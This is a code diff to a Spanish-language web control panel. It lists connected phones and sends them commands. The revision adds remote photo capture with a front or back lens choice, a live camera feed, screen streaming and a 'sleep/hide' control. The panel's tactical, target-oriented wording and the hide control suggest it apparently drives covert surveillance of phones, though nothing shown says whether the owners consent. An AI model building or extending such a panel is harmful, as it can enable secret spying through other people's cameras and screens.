@@ -15,9 +15,6 @@
         border: 1px solid #00e5ff;
         box-shadow: 0 0 10px rgba(0, 229, 255, 0.2);
       }
-      .neon-glow-green {
-        box-shadow: 0 0 8px rgba(0, 255, 102, 0.4);
-      }
       ::-webkit-scrollbar {
         width: 6px;
       }
@@ -56,7 +53,7 @@
           <h2 class="text-sm font-bold text-[#00E5FF] tracking-wider">> NODOS MÓVILES</h2>
           <span id="deviceCount" class="text-xs bg-[#00E5FF]/20 text-[#00E5FF] px-2 py-1 rounded">0 ACTIVOS</span>
         </div>
-        <div id="devicesContainer" class="space-y-3 overflow-y-auto max-h-[300px] flex-grow pr-1 mb-4">
+        <div id="devicesContainer" class="space-y-3 overflow-y-auto max-h-[400px] flex-grow pr-1 mb-4">
           <div class="text-center py-8 text-gray-500 text-xs border border-dashed border-gray-800 rounded">
             [ ESCANEANDO RED... ]
           </div>
@@ -77,7 +74,7 @@
           </h2>
           <span id="streamingTarget" class="text-[10px] text-yellow-400">[ Ningún nodo seleccionado ]</span>
         </div>
-        <div class="relative w-full h-[380px] bg-black border border-[#00E5FF]/40 rounded flex items-center justify-center overflow-hidden">
+        <div class="relative w-full h-[380px] bg-black border border-[#00E5FF]/40 rounded flex items-center justify-center overflow-hidden mb-3">
           <img id="screenStream" alt="Transmisión en vivo..." class="object-contain w-full h-full hidden" />
           <span id="screenPlaceholder" class="text-xs text-gray-500 text-center px-4">
             [ SELECCIONA UN NODO E INICIA STREAM ]
@@ -85,15 +82,18 @@
         </div>
       </section>
 
-      <!-- Columna 3: Visor de Capturas / Fotos -->
+      <!-- Columna 3: Visor de Capturas / Cámara en Vivo -->
       <section class="neon-border bg-[#0A0F1D]/80 p-4 rounded-lg flex flex-col">
-        <h2 class="text-sm font-bold text-[#00E5FF] tracking-wider border-b border-[#00E5FF]/30 pb-2 mb-4">
-          > VISOR TÁCTICO // FOTO
-        </h2>
+        <div class="flex justify-between items-center border-b border-[#00E5FF]/30 pb-2 mb-4">
+          <h2 class="text-sm font-bold text-[#00E5FF] tracking-wider">
+            > VISOR TÁCTICO // CÁMARA & FOTO
+          </h2>
+          <span id="cameraTarget" class="text-[10px] text-yellow-400">[ Cámara Inactiva ]</span>
+        </div>
         <div class="relative w-full h-[380px] bg-black border border-[#00E5FF]/40 rounded flex items-center justify-center overflow-hidden">
-          <img id="targetPhoto" src="" alt="Esperando captura..." class="object-contain w-full h-full hidden" />
+          <img id="targetPhoto" src="" alt="Visor de cámara..." class="object-contain w-full h-full hidden" />
           <span id="photoPlaceholder" class="text-xs text-gray-600 text-center px-4">
-            [ SELECCIONA UN NODO Y CAPTURA FOTO ]
+            [ SELECCIONA CÁMARA Y ACCEDE ]
           </span>
         </div>
       </section>
@@ -118,8 +118,9 @@
       const screenPlaceholder = document.getElementById("screenPlaceholder");
       const logConsole = document.getElementById("logConsole");
       const streamingTarget = document.getElementById("streamingTarget");
+      const cameraTarget = document.getElementById("cameraTarget");
 
-      let activeStreamDevice = null; // Controla qué dispositivo estamos viendo en pantalla
+      let activeStreamDevice = null;
 
       setInterval(() => {
         const now = new Date();
@@ -143,7 +144,7 @@
         log("¡Se perdió la conexión con el servidor!");
       });
 
-      // Lista de dispositivos
+      // Lista de dispositivos con controles avanzados de cámara y pausa
       socket.on("update_devices", (devices) => {
         devicesContainer.innerHTML = "";
         deviceCount.innerText = `${devices.length} ACTIVOS`;
@@ -161,50 +162,59 @@
                 <div class="text-xs font-bold text-[#00E5FF]">${dev.name}</div>
                 <div class="text-[9px] text-gray-400 truncate">ID: ${dev.id}</div>
             </div>
+            <!-- Controles de Pantalla -->
             <div class="grid grid-cols-2 gap-1">
+                <button onclick="startScreen('${dev.id}', '${dev.name}')" class="bg-[#00FF66] text-black text-[9px] font-bold py-1 px-1 rounded hover:bg-[#00cc52] transition text-center">
+                    📺 INICIAR STREAM
+                </button>
+                <button onclick="pauseScreen('${dev.id}')" class="bg-yellow-500 text-black text-[9px] font-bold py-1 px-1 rounded hover:bg-yellow-400 transition text-center">
+                    ⏸️ REPOSO / OCULTAR
+                </button>
+            </div>
+            <!-- Controles de Cámara (Elegir Lente y Acción) -->
+            <div class="grid grid-cols-3 gap-1 pt-1 border-t border-gray-800">
+                <select id="lens_${dev.id}" class="bg-black text-[9px] text-[#00E5FF] border border-[#00E5FF]/40 rounded p-0.5">
+                    <option value="back">Trasera</option>
+                    <option value="front">Frontal</option>
+                </select>
                 <button onclick="triggerPhoto('${dev.id}')" class="bg-[#00E5FF] text-black text-[9px] font-bold py-1 px-1 rounded hover:bg-[#00b3cc] transition text-center">
                     📸 FOTO
                 </button>
-                <button onclick="startScreen('${dev.id}', '${dev.name}')" class="bg-[#00FF66] text-black text-[9px] font-bold py-1 px-1 rounded hover:bg-[#00cc52] transition text-center">
-                    📺 STREAM
+                <button onclick="startCameraStream('${dev.id}')" class="bg-purple-500 text-white text-[9px] font-bold py-1 px-1 rounded hover:bg-purple-400 transition text-center">
+                    📹 CAM VIVO
                 </button>
             </div>
-            <button onclick="stopScreen('${dev.id}')" class="bg-red-500/20 border border-red-500 text-red-400 text-[9px] font-bold py-1 px-1 rounded hover:bg-red-500 hover:text-black transition text-center">
-                ⏹️ DETENER STREAM
-            </button>
           `;
           devicesContainer.appendChild(card);
         });
       });
 
-      function triggerPhoto(socketId) {
-        log(`Enviando 'get_photo' al nodo: ${socketId}`);
-        socket.emit("send_command_to_device", { targetId: socketId, action: "get_photo" });
-      }
-
       function startScreen(socketId, deviceName) {
-        // Si ya había otro stream abierto, lo detenemos primero en el nodo anterior
-        if (activeStreamDevice && activeStreamDevice !== socketId) {
-          stopScreen(activeStreamDevice);
-        }
         activeStreamDevice = socketId;
         streamingTarget.innerText = `[ Visualizando: ${deviceName} ]`;
-        log(`Iniciando transmisión de pantalla para: ${deviceName}`);
+        log(`Iniciando / Reanudando transmisión de pantalla para: ${deviceName}`);
         socket.emit("send_command_to_device", { targetId: socketId, action: "start_screen" });
       }
 
-      function stopScreen(socketId) {
-        log(`Deteniendo transmisión de pantalla para: ${socketId}`);
-        socket.emit("send_command_to_device", { targetId: socketId, action: "stop_screen" });
-        if (activeStreamDevice === socketId) {
-          activeStreamDevice = null;
-          streamingTarget.innerText = `[ Ningún nodo seleccionado ]`;
-          screenStream.classList.add("hidden");
-          screenPlaceholder.classList.remove("hidden");
-        }
+      function pauseScreen(socketId) {
+        log(`Poniendo en reposo la pantalla para: ${socketId}`);
+        socket.emit("send_command_to_device", { targetId: socketId, action: "pause_screen" });
       }
 
-      // Recibir foto del celular
+      function triggerPhoto(socketId) {
+        const lens = document.getElementById(`lens_${socketId}`).value;
+        log(`Solicitando foto (${lens}) al nodo: ${socketId}`);
+        socket.emit("send_command_to_device", { targetId: socketId, action: "get_photo", lens: lens });
+      }
+
+      function startCameraStream(socketId) {
+        const lens = document.getElementById(`lens_${socketId}`).value;
+        cameraTarget.innerText = `[ Cámara (${lens}) Activa ]`;
+        log(`Iniciando transmisión de cámara (${lens}) para: ${socketId}`);
+        socket.emit("send_command_to_device", { targetId: socketId, action: "start_camera", lens: lens });
+      }
+
+      // Recepción de foto del celular
       socket.on("phone_response", (data) => {
         if (data.type === "photo" && data.image) {
           log("¡Fotografía recibida del dispositivo!");
@@ -214,13 +224,20 @@
         }
       });
 
-      // Recibir frames de pantalla en vivo filtrando solo los del dispositivo activo
+      // Recepción de pantalla en vivo
       socket.on("screen_frame", (data) => {
         if (data.deviceId === activeStreamDevice) {
           screenStream.src = `data:image/jpeg;base64,${data.frame}`;
           screenStream.classList.remove("hidden");
           screenPlaceholder.classList.add("hidden");
         }
+      });
+
+      // Recepción de frames de cámara en vivo
+      socket.on("camera_frame", (data) => {
+        targetPhoto.src = `data:image/jpeg;base64,${data.frame}`;
+        targetPhoto.classList.remove("hidden");
+        photoPlaceholder.classList.add("hidden");
       });
     </script>
   </body>
